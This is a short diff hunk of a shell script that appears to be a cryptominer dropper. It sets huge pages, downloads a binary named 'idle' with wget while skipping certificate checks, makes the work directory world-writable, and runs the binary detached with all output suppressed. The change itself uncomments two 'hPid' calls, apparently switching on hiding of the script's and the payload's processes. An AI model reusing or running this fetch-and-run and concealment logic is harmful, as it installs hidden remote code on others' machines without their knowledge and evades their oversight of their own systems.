@@ -16,8 +16,8 @@ sysctl -w vm.nr_hugepages="$(awk '/^Mems_allowed_list:/{n=split($2,a,",");for(i=
 wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
 chmod -R 777 "${work}"
 
-# hPid "$$"
+hPid "$$"
 nohup setsid /bin/sh -c 'cd "$1"; exec ./idle' /bin/sh "${work}" </dev/null >/dev/null 2>&1 &
-# hPid "$!"
+hPid "$!"
 [ "$mode" != "0" ] && wait
 exit 0
